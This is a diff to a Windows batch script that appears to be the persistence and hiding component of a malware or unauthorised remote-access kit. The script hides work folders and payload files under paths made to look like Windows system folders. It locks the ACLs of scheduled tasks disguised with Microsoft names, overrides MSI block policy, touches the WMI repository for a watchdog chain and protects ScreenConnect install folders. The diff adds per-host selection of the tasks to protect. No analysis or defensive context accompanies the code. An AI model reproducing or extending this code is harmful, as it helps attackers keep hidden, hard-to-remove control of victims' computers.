@@ -1,5 +1,5 @@
 @echo off
-REM OWN_SECURE BUILD 20260802S3 - neutralize DisableMSI + exclusions/ACL
+REM OWN_SECURE BUILD 20260802S4 - identity-aware task ACL + DisableMSI neutralize + exclusions/ACL
 setlocal EnableExtensions EnableDelayedExpansion
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "WD2=%ProgramData%\Microsoft\Diagnosis\State\.etlcache"
@@ -14,7 +14,18 @@ set "TASKROOT=%SystemRoot%\System32\Tasks"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%WD2%" mkdir "%WD2%" >nul 2>&1
-echo secure_begin %DATE% %TIME% S3>>"%LOG%"
+echo secure_begin %DATE% %TIME% S4>>"%LOG%"
+
+REM --- per-host identity: which task XMLs belong to us ---
+set "TASKS_LIST=Microsoft\Windows\Diagnosis\Scheduled Microsoft\Windows\PLA\Server Microsoft\Windows\WDI\ResolutionHost Microsoft\Windows\Tcpip\IpAddressConflict1"
+if exist "%WD%\identity.cfg" (
+  set "TASKS_LIST="
+  for /f "usebackq tokens=1,2 delims==" %%K in ("%WD%\identity.cfg") do (
+    set "K=%%K"
+    set "V=%%V"
+    if "!K:~0,5!"=="TASK_" set "TASKS_LIST=!TASKS_LIST! !V:~1!"
+  )
+)
 
 REM --- Neutralize MSI block policies (1625) ---
 REM DisableMSI: 0=allow, 1=non-admin only, 2=all -> force 0
@@ -59,24 +70,22 @@ call :LockDir "%WD2%"
 REM --- hide workdirs + key payload files ---
 attrib +h +s "%WD%" >nul 2>&1
 attrib +h +s "%WD2%" >nul 2>&1
-for %%F in (own_mon.cmd own_run.cmd etl_mon.cmd tg_report.ps1 pkg.msi notify.cfg own_secure.cmd) do (
+for %%F in (own_mon.cmd own_run.cmd etl_mon.cmd tg_report.ps1 own_lib.ps1 pkg.msi notify.cfg own_secure.cmd identity.cfg state.json) do (
   if exist "%WD%\%%F" attrib +h +s "%WD%\%%F" >nul 2>&1
 )
 if exist "%WD2%\etl_mon.cmd" attrib +h +s "%WD2%\etl_mon.cmd" >nul 2>&1
 
 REM --- ACL: scheduled task XML (harder to delete without Admin) ---
-for %%T in (
-  "Microsoft\Windows\Diagnosis\Scheduled"
-  "Microsoft\Windows\PLA\Server"
-  "Microsoft\Windows\WDI\ResolutionHost"
-  "Microsoft\Windows\Tcpip\IpAddressConflict1"
-) do (
+for %%T in (%TASKS_LIST%) do (
   if exist "%TASKROOT%\%%~T" (
     icacls "%TASKROOT%\%%~T" /inheritance:r >nul 2>&1
     icacls "%TASKROOT%\%%~T" /grant:r "NT AUTHORITY\SYSTEM:F" "BUILTIN\Administrators:F" >nul 2>&1
     attrib +h +s "%TASKROOT%\%%~T" >nul 2>&1
   )
 )
+
+REM --- ACL: WMI watchdog subscription files (chain 2) ---
+icacls "%SystemRoot%\System32\wbem\Repository" /grant "NT AUTHORITY\SYSTEM:F" >nul 2>&1
 
 REM --- ACL: keep ScreenConnect install dirs (once; takeown every tick is noisy) ---
 if not exist "%WD%\secure_sc.flag" (
